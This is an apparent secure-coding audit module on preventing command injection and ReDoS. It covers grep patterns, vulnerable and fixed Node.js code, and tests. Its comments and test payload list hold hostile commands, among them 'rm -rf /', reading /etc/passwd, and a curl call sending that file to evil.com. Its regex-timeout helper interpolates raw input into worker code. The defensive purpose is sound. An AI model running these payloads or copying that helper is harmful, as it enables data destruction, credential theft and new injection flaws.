# Specialized Module: Command Injection & ReDoS

**Token Estimate:** ~2,000 tokens
**Purpose:** Prevent command injection and Regular Expression Denial of Service
**Dependencies:** core/03_input_validation.md
**Best For:** Applications with shell execution or complex regex patterns

---

## Objective

Prevent command injection attacks and ReDoS (Regular Expression Denial of Service) vulnerabilities.

---

## Part 1: Command Injection Prevention

## 1. Shell Command Execution Audit

### 1.1 Find All Shell Executions

```
Grep patterns (Node.js):
- "exec\\(|execSync\\(|spawn\\(|execFile\\("
- "child_process"
- "shell.*=.*true"

Grep patterns (Python):
- "os\\.system|subprocess\\.|shell=True"
- "os\\.popen|commands\\."

Grep patterns (Ruby):
- "system\\(|exec\\(|`|%x"
- "Open3\\."

Grep patterns (PHP):
- "shell_exec|exec|system|passthru"
- "proc_open|popen"
```

---

## 2. Command Injection Patterns

### 2.1 User Input in Commands

```typescript
// ❌ P0 - CRITICAL VULNERABILITY
const { exec } = require('child_process')

app.post('/convert', (req, res) => {
  exec(`convert ${req.body.filename} output.png`)
  // Attacker: { filename: "input.jpg; rm -rf /" }
})

// ❌ STILL VULNERABLE - Template literals
exec(`imagemagick ${userInput}`)
// Attacker: "input.jpg`curl evil.com/steal?data=$(cat /etc/passwd)`"

// ❌ VULNERABLE - spawn with shell:true
spawn('convert', [userInput, 'output.png'], { shell: true })
// shell:true allows command injection via shell metacharacters
```

**Flag P0 if:**
- User input in shell commands
- Uses `exec()` or `execSync()` with user input
- Uses `spawn()` with `shell: true`
- Uses backticks or `$()` with user input

---

### 2.2 Secure Patterns

```typescript
// ✅ SECURE - Use execFile (no shell)
const { execFile } = require('child_process')

app.post('/convert', async (req, res) => {
  // 1. Validate filename
  const filename = path.basename(req.body.filename)
  if (!/^[a-zA-Z0-9_.-]+$/.test(filename)) {
    throw new Error('Invalid filename')
  }

  // 2. Use execFile (bypasses shell)
  try {
    await execFilePromise('convert', [
      filename,
      'output.png'
    ], {
      timeout: 10000,
      cwd: '/safe/directory'
    })
  } catch (error) {
    throw new Error('Conversion failed')
  }
})

// ✅ SECURE - spawn without shell
const { spawn } = require('child_process')

const process = spawn('convert', [filename, 'output.png'], {
  shell: false,  // Critical!
  timeout: 10000
})
```

---

### 2.3 Input Sanitization for Shell Commands

**If shell commands are absolutely necessary:**

```typescript
// ✅ LEAST BAD - Strict whitelist + escaping
import { execFile } from 'child_process'
import { promisify } from 'util'

const execFilePromise = promisify(execFile)

function sanitizeFilename(input: string): string {
  // Remove path separators
  let safe = path.basename(input)

  // Whitelist allowed characters
  if (!/^[a-zA-Z0-9_.-]+$/.test(safe)) {
    throw new Error('Filename contains invalid characters')
  }

  // Limit length
  if (safe.length > 100) {
    throw new Error('Filename too long')
  }

  return safe
}

// Use with execFile, never exec
const filename = sanitizeFilename(userInput)
await execFilePromise('convert', [filename, 'output.png'])
```

**Dangerous characters to block:**
- Shell metacharacters: `;`, `|`, `&`, `$`, `` ` ``, `(`, `)`, `<`, `>`, `\n`, `\r`
- Path traversal: `..`, `/`, `\`
- Wildcards: `*`, `?`, `[`, `]`

---

## 3. Alternative to Shell Commands

### 3.1 Use Libraries Instead

```typescript
// ❌ RISKY - Shell command for image processing
exec(`convert ${input} ${output}`)

// ✅ BETTER - Use sharp library
import sharp from 'sharp'

await sharp(inputPath)
  .resize(800, 600)
  .toFile(outputPath)

// ❌ RISKY - Shell for file operations
exec(`zip -r ${zipName} ${directory}`)

// ✅ BETTER - Use archiver library
import archiver from 'archiver'

const archive = archiver('zip')
archive.directory(directory, false)
archive.pipe(output)
await archive.finalize()
```

**Preferred libraries:**
- Images: `sharp`, `jimp`
- Archives: `archiver`, `adm-zip`
- File operations: `fs/promises`
- Git operations: `simple-git`

---

## 4. Path Traversal in Commands

### 4.1 File Path Validation

```typescript
// ❌ VULNERABLE - Path traversal
app.get('/download', (req, res) => {
  const file = req.query.file
  exec(`cat /uploads/${file}`)
  // Attacker: ?file=../../../../etc/passwd
})

// ✅ SECURE - Path sanitization
const safeFile = path.basename(req.query.file)
const fullPath = path.join('/uploads', safeFile)

// Verify resolved path is still within allowed directory
const relative = path.relative('/uploads', fullPath)
if (relative.startsWith('..') || path.isAbsolute(relative)) {
  throw new Error('Invalid path')
}

// Use fs, not shell
const content = await fs.promises.readFile(fullPath, 'utf8')
```

---

## Part 2: ReDoS Prevention

## 5. ReDoS Pattern Detection

### 5.1 Find All Regex Patterns

```
Grep patterns:
- "new RegExp|RegExp\\(|\\.test\\(|\\.match\\("
- "\\.replace\\(.*\\/|\\.split\\(.*\\/"
- "Pattern\\.compile" (Java)
- "re\\.compile|re\\.match" (Python)
```

---

## 6. Dangerous Regex Patterns

### 6.1 Nested Quantifiers

```typescript
// ❌ P0 - EXPONENTIAL BACKTRACKING
const regex = /^(a+)+$/
// Input: "aaaaaaaaaaaaaaaaaaaa!" causes catastrophic backtracking
// Time complexity: O(2^n)

// ❌ VULNERABLE - Overlapping alternatives
const emailRegex = /^([a-zA-Z0-9]+)*@/
// Input: "aaaaaaaaaaaaaaaaaaa!" hangs

// ❌ VULNERABLE - Nested quantifiers
const urlRegex = /(https?:\/\/)?(www\.)?([a-z]+\.)+[a-z]{2,}/
// Domain with many dots: "a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.com"
```

**Dangerous patterns:**
- `(a+)+`, `(a*)*`, `(a+)*` - Nested quantifiers
- `(a|ab)+` - Overlapping alternatives
- `(a|a)*` - Ambiguous alternatives
- `.*.*` - Multiple wildcard quantifiers

---

### 6.2 Safe Regex Patterns

```typescript
// ✅ SECURE - No nested quantifiers
const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/
// No exponential backtracking

// ✅ SECURE - Atomic grouping (where supported)
const safeRegex = /^(?>a+)@/  // Atomic group prevents backtracking

// ✅ SECURE - Explicit length limits
function validateUsername(input: string): boolean {
  if (input.length > 50) return false  // Pre-check length
  return /^[a-zA-Z0-9_-]+$/.test(input)
}
```

---

### 6.3 Input Length Limits

```typescript
// ✅ SECURE - Limit input before regex
function validateEmail(email: string): boolean {
  // Prevent ReDoS by limiting length
  if (email.length > 254) {  // RFC 5321 max
    return false
  }

  // Safe regex (no nested quantifiers)
  return /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(email)
}

// ✅ SECURE - Timeout for regex operations
function matchWithTimeout(pattern: RegExp, input: string, timeoutMs = 100): boolean {
  const worker = new Worker(`
    const pattern = ${pattern}
    const result = pattern.test('${input}')
    postMessage(result)
  `)

  return new Promise((resolve, reject) => {
    const timeout = setTimeout(() => {
      worker.terminate()
      reject(new Error('Regex timeout'))
    }, timeoutMs)

    worker.on('message', (result) => {
      clearTimeout(timeout)
      resolve(result)
    })
  })
}
```

---

## 7. ReDoS Testing

### 7.1 Test Complex Regexes

```typescript
// Test regex for catastrophic backtracking
describe('ReDoS Prevention', () => {
  test('Email regex completes quickly', () => {
    const start = Date.now()
    const maliciousInput = 'a'.repeat(50) + '!'

    /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(maliciousInput)

    const duration = Date.now() - start
    expect(duration).toBeLessThan(10)  // Should complete in <10ms
  })

  test('Rejects overly long inputs', () => {
    const longInput = 'a'.repeat(10000)
    expect(() => validateEmail(longInput)).toThrow()
  })
})
```

**Online testing tools:**
- https://devina.io/redos-checker
- https://regex101.com (shows step count)

---

## 8. Command Injection Testing

### 8.1 Test Payloads

```typescript
const COMMAND_INJECTION_PAYLOADS = [
  'input.jpg; rm -rf /',
  'input.jpg && cat /etc/passwd',
  'input.jpg | curl evil.com',
  'input.jpg`whoami`',
  'input.jpg$(whoami)',
  '../../../etc/passwd',
  'input.jpg\nwhoami',
  'input.jpg||whoami',
]

describe('Command Injection Prevention', () => {
  for (const payload of COMMAND_INJECTION_PAYLOADS) {
    test(`Blocks: ${payload}`, async () => {
      await expect(
        convertImage({ filename: payload })
      ).rejects.toThrow(/invalid|forbidden/i)
    })
  }

  test('Allows safe filenames', async () => {
    await expect(
      convertImage({ filename: 'image_01.jpg' })
    ).resolves.toBeDefined()
  })
})
```

---

## Command Injection & ReDoS Checklist

### Command Injection:
- [ ] All shell executions identified
- [ ] No `exec()` or `execSync()` with user input
- [ ] `spawn()` uses `shell: false`
- [ ] Prefer `execFile()` over `exec()`
- [ ] Input sanitized with strict whitelist
- [ ] Path traversal prevented
- [ ] Use libraries instead of shell commands where possible
- [ ] Test coverage for injection payloads

### ReDoS Prevention:
- [ ] All regex patterns identified
- [ ] No nested quantifiers (a+)+
- [ ] No overlapping alternatives (a|ab)+
- [ ] Input length limits before regex
- [ ] Complex regexes tested for performance
- [ ] Timeouts on regex operations
- [ ] Test coverage for malicious inputs

---

**Severity Summary:**
- **P0:** Command injection with user input, exponential backtracking regex on user input
- **P1:** Using `shell: true`, no input length limits, untested complex regex
- **P2:** Missing sanitization on low-risk commands

**Common Mistakes:**
1. Thinking `spawn()` is always safe (requires `shell: false`)
2. Using template literals in shell commands
3. Not validating path traversal
4. Regex with nested quantifiers on user input
5. No length limits before regex operations

**Testing:**
- Test with `;`, `|`, `&`, `$()`, backticks
- Test with `../../../`
- Test regex with 50+ character malicious inputs
- Measure regex execution time

**See Also:**
- core/03_input_validation.md - General input validation
- specialized/ai_security.md - Injection in AI contexts
